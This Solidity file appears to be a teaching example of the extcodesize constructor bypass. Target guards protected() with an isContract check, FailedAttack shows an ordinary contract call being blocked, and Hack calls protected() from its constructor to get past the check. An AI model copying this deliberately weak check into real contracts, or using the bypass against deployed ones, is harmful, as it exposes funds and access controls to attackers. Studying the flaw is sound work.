// SPDX-License-Identifier: MIT
pragma solidity ^0.8.7;

contract Target {
  function isContract(address account) public view returns (bool) {
    uint256 size;
    assembly {
      size := extcodesize(account)
    }
    return size > 0; // if size is 0, that mean this address has no code (EOA), but this func has a problem: if we call from the contructor (which its code is not stored in the contract but in the bytecode) we will be able to bypass this check
  }

  bool public pwned = false;

  function protected() external {
    require(!isContract(msg.sender), "no contract allowed");
    pwned = true;
  }
}

/// Exemple of request with normal contract
contract FailedAttack {
  /// Attempting to call Target.protected will fail, Target block calls from contract
  function pwn(address _target) external {
    /// This will fail
    Target(_target).protected();
  }
}

contract Hack {
  bool public isContract;

  constructor(address _target) {
    isContract = Target(_target).isContract(address(this));
    Target(_target).protected();
  }
}
